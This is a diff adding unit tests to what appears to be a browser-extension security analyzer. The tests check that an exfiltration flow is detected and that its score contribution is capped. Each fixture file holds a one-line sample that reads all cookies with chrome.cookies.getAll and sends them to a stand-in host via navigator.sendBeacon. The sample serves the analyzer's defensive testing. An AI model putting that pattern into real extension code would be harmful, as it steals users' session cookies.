@@ -174,3 +174,28 @@ class TestUnexpectedPermissions:
         assert any("not expected for category" in r.lower() for r in report.reasons), (
             f"Expected an unexpected-permission reason, got: {report.reasons}"
         )
+
+
+class TestCodeReviewScoring:
+    def test_contribution_is_capped_and_reasoned(self, tmp_path):
+        from extanalyze.analysis.code_review import review_directory
+        from extanalyze.scoring.aggregator import CODE_REVIEW_CAP
+
+        files = {}
+        for i in range(10):
+            (tmp_path / f"f{i}.js").write_text(
+                "chrome.cookies.getAll({});navigator.sendBeacon('https://a.test');"
+            )
+            files[f"f{i}.js"] = None
+        cr = review_directory(tmp_path, list(files))
+        assert len(cr.exfil_flows) == 10
+
+        base = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
+        with_cr = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=cr)
+        assert with_cr.score - base.score == CODE_REVIEW_CAP
+        assert any("exfiltration flow" in r for r in with_cr.reasons)
+
+    def test_none_code_review_is_neutral(self):
+        a = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
+        b = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=None)
+        assert a.score == b.score
